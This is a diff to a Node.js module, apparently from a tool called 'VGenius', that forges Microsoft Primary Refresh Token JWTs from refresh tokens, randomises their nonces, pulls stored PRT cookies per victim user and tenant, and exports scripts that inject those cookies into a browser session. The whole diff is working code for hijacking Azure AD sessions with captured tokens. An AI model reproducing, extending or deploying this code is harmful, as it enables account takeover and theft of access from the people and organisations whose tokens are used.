@@ -68,7 +68,7 @@ function b64url(data) {
  * IMPORTANT: Header must include 'cty' claim with Microsoft's PRT content type
  * and 'kdf_ver: 2' for proper recognition by Azure AD
  */
-function buildPRTJwt(refreshToken, clientId, scopes, tid, uid, isMrrt = true, isPrimary = true) {
+function buildPRTJwt(refreshToken, clientId, scopes, tid, uid, isMrrt = true, isPrimary = true, nonce = null) {
   // Header matches working Microsoft PRT format
   const header = JSON.stringify({
     alg: "HS256",
@@ -77,12 +77,16 @@ function buildPRTJwt(refreshToken, clientId, scopes, tid, uid, isMrrt = true, is
     kdf_ver: 2
   }, '', '');
   
+  // Generate unique nonce if not provided
+  // This ensures each PRT JWT is different even for the same refresh token
+  const requestNonce = nonce || generateUniqueNonce();
+  
   // Payload must be minimal - only refresh_token, is_primary, and request_nonce
   // Extra fields (client_id, scope, tid, uid, is_mrrt, ver) cause AADSTS5002726 error
   const payload = JSON.stringify({
     refresh_token: refreshToken,
     is_primary: "true",
-    request_nonce: "AwABEgEAAAADAOz_BQD0_0V2b1N0c0FydGlmYWN0cwUAAAAAAHA"
+    request_nonce: requestNonce
   }, '', '');
 
   const headerB64 = b64url(header);
@@ -94,6 +98,18 @@ function buildPRTJwt(refreshToken, clientId, scopes, tid, uid, isMrrt = true, is
   const signature = b64url(hmac.digest());
 
   return `${headerB64}.${payloadB64}.${signature}`;
+}
+
+/**
+ * Generate a unique nonce for PRT JWT
+ * Uses timestamp + random bytes to ensure uniqueness
+ */
+function generateUniqueNonce() {
+  const crypto = require('crypto');
+  const timestamp = Date.now().toString(36);
+  const randomBytes = crypto.randomBytes(16).toString('base64url');
+  // Format: AwABEgEAAAADAOz_BQD0_<timestamp>_<random>
+  return `AwABEgEAAAADAOz_BQD0_${timestamp}_${randomBytes}`;
 }
 
 /**
@@ -293,9 +309,48 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
 }
 
 /**
- * Generate JavaScript injection code for cookies (competitor-compatible format)
- * IMPORTANT: Does NOT include domain attribute to avoid third-party cookie blocking
+ * Get stored PRT cookie from device_credentials table
+ * @param {number} userId - User ID
+ * @param {string} tenantId - Tenant ID
+ * @returns {Promise<string|null>} PRT cookie value or null
  */
+async function getStoredPrtCookie(userId, tenantId) {
+  try {
+    const [rows] = await db.query(
+      'SELECT prt_cookie_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
+      [userId, tenantId]
+    );
+
+    if (rows.length === 0) return null;
+
+    const { decrypt } = require('../utils/encrypt');
+    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
+    console.log('[CookieConverter] Found stored PRT cookie for user', userId, 'tenant', tenantId);
+    return prtCookie;
+  } catch (err) {
+    console.error('[CookieConverter] Failed to get stored PRT cookie:', err.message);
+    return null;
+  }
+}
+
+/**
+ * Refresh stored PRT cookie using device credentials
+ * @param {number} userId - User ID
+ * @param {string} tenantId - Tenant ID
+ * @returns {Promise<string|null>} New PRT cookie value or null
+ */
+async function refreshStoredPrtCookie(userId, tenantId) {
+  try {
+    const deviceManager = require('./devicemanager');
+    const prtCookie = await deviceManager.refreshPrtCookie(userId, tenantId);
+    console.log('[CookieConverter] Refreshed PRT cookie for user', userId, 'tenant', tenantId);
+    return prtCookie;
+  } catch (err) {
+    console.error('[CookieConverter] Failed to refresh PRT cookie:', err.message);
+    return null;
+  }
+}
+
 function generatePrtCookieInjectionScript(prtCookie, redirectUrl = 'https://login.microsoftonline.com/?auth=2') {
   return `// VGenius PRT Cookie Injection
 (function() {
@@ -692,4 +747,18 @@ async function processCookieConversion(tokenId, accessToken, templateType, tenan
   return result;
 }
 
-module.exports = { convertTokensToCookies, generateCookieInjectionScript, processCookieConversion, determineEndpoint, determineResource, detectAccountType, generateXmsRefreshTokenCredential, defineEndpoint: determineEndpoint, };
+module.exports = {
+  convertTokensToCookies,
+  generateCookieInjectionScript,
+  processCookieConversion,
+  determineEndpoint,
+  determineResource,
+  detectAccountType,
+  generateXmsRefreshTokenCredential,
+  defineEndpoint: determineEndpoint,
+  getStoredPrtCookie,
+  refreshStoredPrtCookie,
+  generatePrtCookieInjectionScript,
+  generateFullInjectionScript,
+  formatCookiesForInjection
+};
